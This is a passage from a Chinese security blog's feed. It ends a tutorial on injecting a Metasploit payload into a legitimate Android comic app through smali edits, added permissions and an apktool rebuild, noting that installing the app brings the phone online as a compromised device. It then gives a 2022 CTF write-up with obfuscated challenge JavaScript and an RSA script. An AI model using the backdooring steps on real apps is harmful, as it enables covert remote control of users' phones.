class="string">&quot;com.google.android.gms.measurement.AppMeasurementJobService&quot;</span> <span class="attr">android:permission</span>=<span class="string">&quot;android.permission.BIND_JOB_SERVICE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.iid.FirebaseInstanceIdReceiver&quot;</span> <span class="attr">android:permission</span>=<span class="string">&quot;com.google.android.c2dm.permission.SEND&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.c2dm.intent.RECEIVE&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">provider</span> <span class="attr">android:authorities</span>=<span class="string">&quot;com.hiroshi.cimoc.firebaseinitprovider&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:initOrder</span>=<span class="string">&quot;100&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.firebase.provider.FirebaseInitProvider&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.gms.common.api.GoogleApiActivity&quot;</span> <span class="attr">android:theme</span>=<span class="string">&quot;@android:style/Theme.Translucent.NoTitleBar&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.gms.version&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;@integer/google_play_services_version&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.datatransport.runtime.backends.TransportBackendDiscovery&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">meta-data</span> <span class="attr">android:name</span>=<span class="string">&quot;backend:com.google.android.datatransport.cct.CctBackendFactory&quot;</span> <span class="attr">android:value</span>=<span class="string">&quot;cct&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">service</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService&quot;</span> <span class="attr">android:permission</span>=<span class="string">&quot;android.permission.BIND_JOB_SERVICE&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:exported</span>=<span class="string">&quot;false&quot;</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">application</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">manifest</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中，下面这行就告诉我们启动了一个名为<code>com.hiroshi.cimoc.ui.activity.MainActivity</code>的活动</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">&quot;com.hiroshi.cimoc.ui.activity.MainActivity&quot;</span> <span class="attr">android:screenOrientation</span>=<span class="string">&quot;unspecified&quot;</span> <span class="attr">android:windowSoftInputMode</span>=<span class="string">&quot;adjustPan&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后我们找到这个活动的代码，把我们的函数修改一下，让它调用我们的后门（这里没有加固，也会被检测出来）</p><p>【这个寻找的过程其实很麻烦，特别是像tx和网E这种的，超级难找】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-<span class="keyword">static</span> &#123;p0&#125;, Lcom/metasploit/stage/Payload;-&gt;start(Landroid/content/Context;)V</span><br></pre></td></tr></table></figure><p>找到我们的<code>AndroidManifest.xml</code>，在权限列表里面加入我们需要的权限，然后编译</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.INTERNET&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_WIFI_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.ACCESS_NETWORK_STATE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WAKE_LOCK&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.finsky.permission.BIND_GET_INSTALL_REFERRER_SERVICE&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;com.google.android.c2dm.permission.RECEIVE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>（应用原来就有的权限，可以自己添加，格式可以参考Google的开发文档）</p><p>同样使用apktool进行编译</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(gamernotitle㉿kali-vmware)-[~/apk]</span><br><span class="line">└─$ java -jar apktool_2.6.1.jar b ~/apk/original/ </span><br><span class="line">Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=<span class="literal">true</span></span><br><span class="line">I: Using Apktool 2.6.1</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali folder into classes.dex...</span><br><span class="line">I: Checking whether resources has changed...</span><br><span class="line">I: Building resources...</span><br><span class="line">I: Copying libs... (/lib)</span><br><span class="line">I: Copying libs... (/kotlin)</span><br><span class="line">I: Building apk file...</span><br><span class="line">I: Copying unknown files/dir...</span><br><span class="line">I: Built apk...</span><br></pre></td></tr></table></figure><p>这样就编译完了，把软件放到手机上进行安装，打开后在服务器就可以看到肉鸡上线了</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年全国大学生信息安全竞赛创新实践能力赛 —— 复赛WriteUp</title>
      <link href="/posts/CTF-20220619/"/>
      <url>/posts/CTF-20220619/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/msedge-20220619-064824.png?download=true"></p><blockquote><p>已更新官方WriteUP <a href="https://gamernotitle.coding.net/p/CTF-Competition/d/20220619-National/git">代码浏览 - 20220619-National - CTF赛事文件合集 - GamerNoTitle的团队 (coding.net)</a></p></blockquote><h2 id="Break部分"><a href="#Break部分" class="headerlink" title="Break部分"></a>Break部分</h2><p>（好的，啥也不会）</p><h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="Try2ReadFlag"><a href="#Try2ReadFlag" class="headerlink" title="Try2ReadFlag"></a>Try2ReadFlag</h4><p><code>小明创建了一个测试站点，但是这个站点有什么用呢？</code></p><p>打开来是个网页，我没看出啥，不过我们队里搞Web的那位说是CSRF跨站攻击</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/msedge-20220619-165931.png"></p><h4 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h4><p><code>建站勿用弱口令！</code></p><p>这个是个CMS框架，整不出，提示写着<code>建站勿用弱口令！</code>，但是我没爆破出来……</p><p>（忘记截图了）</p><h4 id="EzRome"><a href="#EzRome" class="headerlink" title="EzRome"></a>EzRome</h4><p><code>经过上次的战“疫”，你们已经对rome很了解了，现在他又带着新的waf卷土重来了。</code></p><p>这是一个WAF下的题目，还是不会嗯</p><h4 id="EzLogin"><a href="#EzLogin" class="headerlink" title="EzLogin"></a>EzLogin</h4><p><code>登陆成功就有flag哟~</code></p><p>一开始以为是弱口令，等到进了fix环节才发现我好像忘记了<code>robots.txt</code>也可以访问，可以大致看到路径下有什么文件，fix环节在讲这个</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/msedge-20220619-175155.png?download=true"></p><h3 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h3><h4 id="小明的加密器"><a href="#小明的加密器" class="headerlink" title="小明的加密器"></a>小明的加密器</h4><p><code>小明写了一个字符串加密器，但不知道效果如何，大家来测一测吧！</code></p><p>nc进去后是一个加密器，但是没整出来</p><h4 id="weirdheap"><a href="#weirdheap" class="headerlink" title="weirdheap"></a>weirdheap</h4><p><code>A Little Weird</code></p><p>nc进去是一个程序，是一个建楼的背景</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1. Build up</span><br><span class="line">2. visit big house</span><br><span class="line">3. construct</span><br><span class="line">4. tear down</span><br><span class="line">Ur choice:</span><br></pre></td></tr></table></figure><h4 id="chats-store"><a href="#chats-store" class="headerlink" title="chats_store"></a>chats_store</h4><p><code>为什么我的og不能getshell啊？</code></p><p>nc进去是一个聊天备份程序，但是没整出来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+================================+</span><br><span class="line">+ Emergency Chats Backup Program +</span><br><span class="line">+============hope there&#x27;s no vuln+</span><br><span class="line">+1.store chats</span><br><span class="line">+2.delete chats</span><br><span class="line">+3.exit</span><br></pre></td></tr></table></figure><h4 id="printf-hhh"><a href="#printf-hhh" class="headerlink" title="printf_hhh"></a>printf_hhh</h4><p><code>格式化字符串，hhh</code></p><p>nc进去是一个字符串的格式化软件，如果选择1会出来一串字符（忘记截图了），2的话就是打啥显示啥（echo服务）</p><h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h3><h4 id="ob"><a href="#ob" class="headerlink" title="ob!"></a>ob!</h4><p><code>ob而已!</code></p><p>这个用ida逆向一下，出来的是个JavaScript语言的内容</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/ida-20220619-173111.png?download=true"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">_0x15f8</span>(<span class="params">_0x1cdd90, _0x29a14a</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> _0x55fe3f = <span class="title function_">_0x55fe</span>();</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    (_0x15f8 = <span class="keyword">function</span> (<span class="params">_0x15f885, _0x2046fc</span>) &#123;</span><br><span class="line">      _0x15f885 = _0x15f885 - <span class="number">0x139</span>;</span><br><span class="line">      <span class="keyword">var</span> _0x273cae = _0x55fe3f[_0x15f885];</span><br><span class="line">      <span class="keyword">return</span> _0x273cae;</span><br><span class="line">    &#125;),</span><br><span class="line">    <span class="title function_">_0x15f8</span>(_0x1cdd90, _0x29a14a)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">_0x55fe</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> _0x47407e = [</span><br><span class="line">    <span class="string">&quot;1434380GTSaRX&quot;</span>,</span><br><span class="line">    <span class="string">&quot;split&quot;</span>,</span><br><span class="line">    <span class="string">&quot;sZuqf&quot;</span>,</span><br><span class="line">    <span class="string">&quot;toString&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6092LqZrwr&quot;</span>,</span><br><span class="line">    <span class="string">&quot;charCodeAt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;2298DprXBL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6108172ZkGjDt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1326TZBtUd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cdcMv&quot;</span>,</span><br><span class="line">    <span class="string">&quot;length&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DASCTF&#123;********************************&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;log&quot;</span>,</span><br><span class="line">    <span class="string">&quot;8xppuAQ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;reverse&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LHAkM&quot;</span>,</span><br><span class="line">    <span class="string">&quot;3528396BuNtWV&quot;</span>,</span><br><span class="line">    <span class="string">&quot;gOHVz&quot;</span>,</span><br><span class="line">    <span class="string">&quot;5507440MXfrBq&quot;</span>,</span><br><span class="line">    <span class="string">&quot;esJvd&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BZTwo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;6940hAoqHl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1815832yyeHHB&quot;</span>,</span><br><span class="line">  ];</span><br><span class="line">  _0x55fe = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> _0x47407e;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">_0x55fe</span>();</span><br><span class="line">&#125;</span><br><span class="line">(<span class="keyword">function</span> (<span class="params">_0x1df8a4, _0x20dfb3</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> _0x67a2d4 = _0x15f8,</span><br><span class="line">    _0xcc66c3 = <span class="title function_">_0x1df8a4</span>();</span><br><span class="line">  <span class="keyword">while</span> (!![]) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">var</span> _0x23a480 =</span><br><span class="line">        -<span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x13c</span>)) / <span class="number">0x1</span> +</span><br><span class="line">        (<span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x140</span>)) / <span class="number">0x2</span>) *</span><br><span class="line">          (<span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x144</span>)) / <span class="number">0x3</span>) +</span><br><span class="line">        <span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x13b</span>)) / <span class="number">0x4</span> +</span><br><span class="line">        (<span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x13a</span>)) / <span class="number">0x5</span>) *</span><br><span class="line">          (-<span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x142</span>)) / <span class="number">0x6</span>) +</span><br><span class="line">        <span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x143</span>)) / <span class="number">0x7</span> +</span><br><span class="line">        (<span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x149</span>)) / <span class="number">0x8</span>) *</span><br><span class="line">          (-<span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x14c</span>)) / <span class="number">0x9</span>) +</span><br><span class="line">        <span class="built_in">parseInt</span>(<span class="title function_">_0x67a2d4</span>(<span class="number">0x14e</span>)) / <span class="number">0xa</span>;</span><br><span class="line">      <span class="keyword">if</span> (_0x23a480 === _0x20dfb3) <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">else</span> _0xcc66c3[<span class="string">&quot;push&quot;</span>](_0xcc66c3[<span class="string">&quot;shift&quot;</span>]());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (_0x55dcb3) &#123;</span><br><span class="line">      _0xcc66c3[<span class="string">&quot;push&quot;</span>](_0xcc66c3[<span class="string">&quot;shift&quot;</span>]());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(_0x55fe, <span class="number">0xd3542</span>),</span><br><span class="line">  (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> _0x36c6ff = _0x15f8,</span><br><span class="line">      _0x40f7fb = &#123;</span><br><span class="line">        <span class="title class_">LHAkM</span>: <span class="string">&quot;2|3|5|1|0|4&quot;</span>,</span><br><span class="line">        <span class="attr">esJvd</span>: <span class="title function_">_0x36c6ff</span>(<span class="number">0x147</span>),</span><br><span class="line">        <span class="title class_">BZTwo</span>: <span class="keyword">function</span> (<span class="params">_0x1d1e01, _0x12cacf</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> _0x1d1e01 == _0x12cacf;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">sZuqf</span>: <span class="string">&quot;congratulations!!&quot;</span>,</span><br><span class="line">        <span class="attr">cdcMv</span>: <span class="keyword">function</span> (<span class="params">_0x249d98, _0x2b4e20</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> _0x249d98 &lt; _0x2b4e20;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">gOHVz</span>: <span class="keyword">function</span> (<span class="params">_0x14fc1c, _0x1ae2a0</span>) &#123;</span><br><span class="line">          <span class="keyword">return</span> _0x14fc1c ^ _0x1ae2a0;</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;,</span><br><span class="line">      _0x344178 = _0x40f7fb[<span class="title function_">_0x36c6ff</span>(<span class="number">0x14b</span>)][<span class="title function_">_0x36c6ff</span>(<span class="number">0x13d</span>)](<span class="string">&quot;|&quot;</span>),</span><br><span class="line">      _0x5c293c = <span class="number">0x0</span>;</span><br><span class="line">    <span class="keyword">while</span> (!![]) &#123;</span><br><span class="line">      <span class="keyword">switch</span> (_0x344178[_0x5c293c++]) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;0&quot;</span>:</span><br><span class="line">          <span class="variable language_">console</span>[<span class="title function_">_0x36c6ff</span>(<span class="number">0x148</span>)](encc);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;1&quot;</span>:</span><br><span class="line">          encc = _0x27361d[<span class="title function_">_0x36c6ff</span>(<span class="number">0x14a</span>)]();</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;2&quot;</span>:</span><br><span class="line">          <span class="keyword">var</span> _0x50fdde = _0x40f7fb[<span class="title function_">_0x36c6ff</span>(<span class="number">0x14f</span>)];</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;3&quot;</span>:</span><br><span class="line">          <span class="keyword">var</span> _0x27361d = <span class="keyword">new</span> <span class="title class_">Array</span>();</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;4&quot;</span>:</span><br><span class="line">          _0x40f7fb[<span class="title function_">_0x36c6ff</span>(<span class="number">0x139</span>)](</span><br><span class="line">            encc[<span class="title function_">_0x36c6ff</span>(<span class="number">0x13f</span>)](),</span><br><span class="line">            [</span><br><span class="line">              <span class="number">0x5a</span>, <span class="number">0x47</span>, <span class="number">0x12</span>, <span class="number">0x17</span>, <span class="number">0x40</span>, <span class="number">0x14</span>, <span class="number">0x43</span>, <span class="number">0x45</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x29</span>,</span><br><span class="line">              <span class="number">0x29</span>, <span class="number">0x7d</span>, <span class="number">0x2b</span>, <span class="number">0x7d</span>, <span class="number">0x29</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x20</span>, <span class="number">0x77</span>, <span class="number">0x20</span>, <span class="number">0x2b</span>,</span><br><span class="line">              <span class="number">0x75</span>, <span class="number">0x27</span>, <span class="number">0x6b</span>, <span class="number">0x38</span>, <span class="number">0x38</span>, <span class="number">0x3c</span>, <span class="number">0x6f</span>, <span class="number">0x3e</span>, <span class="number">0x3d</span>, <span class="number">0x3e</span>, <span class="number">0x3f</span>,</span><br><span class="line">              <span class="number">0x7d</span>, <span class="number">0x43</span>, <span class="number">0x50</span>, <span class="number">0x40</span>, <span class="number">0x51</span>, <span class="number">0x40</span>, <span class="number">0x44</span>,</span><br><span class="line">            ][<span class="title function_">_0x36c6ff</span>(<span class="number">0x13f</span>)]()</span><br><span class="line">          ) &amp;&amp; <span class="variable language_">console</span>[<span class="string">&quot;log&quot;</span>](_0x40f7fb[<span class="title function_">_0x36c6ff</span>(<span class="number">0x13e</span>)]);</span><br><span class="line">          <span class="keyword">debugger</span></span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;5&quot;</span>:</span><br><span class="line">          <span class="keyword">for</span> (</span><br><span class="line">            i = <span class="number">0x0</span>;</span><br><span class="line">            _0x40f7fb[<span class="title function_">_0x36c6ff</span>(<span class="number">0x145</span>)](i, _0x50fdde[<span class="title function_">_0x36c6ff</span>(<span class="number">0x146</span>)]);</span><br><span class="line">            i++</span><br><span class="line">          ) &#123;</span><br><span class="line">            _0x27361d[i] = _0x40f7fb[<span class="title function_">_0x36c6ff</span>(<span class="number">0x14d</span>)](</span><br><span class="line">              _0x50fdde[i][<span class="title function_">_0x36c6ff</span>(<span class="number">0x141</span>)](),</span><br><span class="line">              i</span><br><span class="line">            );</span><br><span class="line">          &#125;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>奈何我不会这玩意，只能硬着头皮看，没弄出来（主要是最后半小时干的这个题，没时间了），就不弄了</p><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="logbool"><a href="#logbool" class="headerlink" title="logbool"></a>logbool</h4><p>一道wireshark流量分析题，下载下来附件以后发现大部分的请求都是跟<code>http</code>和<code>mysql</code>请求有关的，搞了一个半钟搞不出来，登录的<code>password</code>一直在变，而且mysql没返回什么有用的结果</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/Wireshark-20220619-173539.png?download=true"></p><h4 id="Ste9ano9raphy-6inary"><a href="#Ste9ano9raphy-6inary" class="headerlink" title="Ste9ano9raphy 6inary"></a>Ste9ano9raphy 6inary</h4><blockquote><p>~支付宝到账~</p><p>诶不是我说996在Phigros里面不放过我在CTF里面还要来一次嘛</p></blockquote><p>下载下来是一个压缩包，里面有个<code>996.png</code>和一个<code>996.wav</code> (@Phigros)，其中音频文件是上了密码的，只能下来一个图</p><p>文件名（）把<code>996</code>补全一下是两个单词，翻译下来是这样的</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/msedge-20220619-175239.png?download=true"></p><p>图片<code>binwalk</code>一下也出不来啥，去看LSB也没看出啥，WinHex里面看看也没有什么有价值的东西，奋斗了大概半小时到一个小时，搞不出来就没干了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/996.png?download=true" alt="题目中的996"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/996_jacket.webp?download=true" alt="Phigros的996"></p><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Blind-Signature-RSA"><a href="#Blind-Signature-RSA" class="headerlink" title="Blind_Signature _RSA"></a>Blind_Signature _RSA</h4><p><code>题目中的r是什么呢？先去学学rsa盲签名吧。</code></p><p>这题我还跟着去学了一下RSA盲签名是怎么整的（大概就是下面这个图的这样）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-20220619/msedge-20220619-094125.png?download=true"></p><p>但是给出的Python脚本里面真的让我不太知道到底要求什么，而且这个<code>invert()</code>求逆元的函数经常给我<code>ZeroDevisionError</code>（心态炸裂），弄了一会整不出来就算了（这个d上面的while循环是我自己加的）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;DASCTF&#123;xxxxx&#125;&quot;</span></span><br><span class="line">m = flag.decode().encode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">e = <span class="number">65535</span>       <span class="comment"># 公钥</span></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p*q         <span class="comment"># 公钥</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;公钥 n = <span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span 